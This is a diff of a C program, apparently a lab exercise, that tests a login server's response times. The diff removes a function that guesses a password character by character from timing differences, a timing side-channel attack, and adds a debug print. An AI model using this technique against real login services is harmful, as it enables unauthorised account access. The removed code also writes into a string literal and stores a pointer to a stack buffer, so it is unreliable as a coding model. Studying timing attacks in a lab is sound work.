@@ -73,36 +73,6 @@ double test_creds(char* user, char* pass, int username_size, int password_size, 
   return ret / 1000;
 }
 
-char* perform_attack(int socket, char* username) {
-  char* guess = ""; //empty string not checked
-  int test;
-  int exec_time = 0;
-
-  while(1) {
-    char current_guess[strlen(guess) + 1]; //?
-    strcpy(current_guess, guess);
-
-    for (int i = 0; i < NUM_CHARS; i++) {
-      strncat(current_guess, &CHARS[i], 1);
-      test = test_creds(username, current_guess, strlen(username), strlen(current_guess), socket);
-      if (test == -1) exit(EXIT_FAILURE);
-      else if (test == -2) {
-        strncat(guess, &CHARS[i], 1);
-        return guess;
-      }
-      else if (test - exec_time > TIME_DIFFERENCE) { //?
-        exec_time = test;
-        guess = current_guess;
-        break;
-      }
-    }
-
-    perror("password not recovered");
-    exit(EXIT_FAILURE); //?
-  }
-  
-  return 0;
-}
 
 int main(int argc, char const *argv[]) {
   if (argc > max_expected_args || argc < 1) {
@@ -172,6 +142,7 @@ int main(int argc, char const *argv[]) {
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
     test5 += test;
+    printf("test: %lf\n", test);
 
     //test6 (incorrect, index 18 of 28)
     password = "shannon_password_sz";
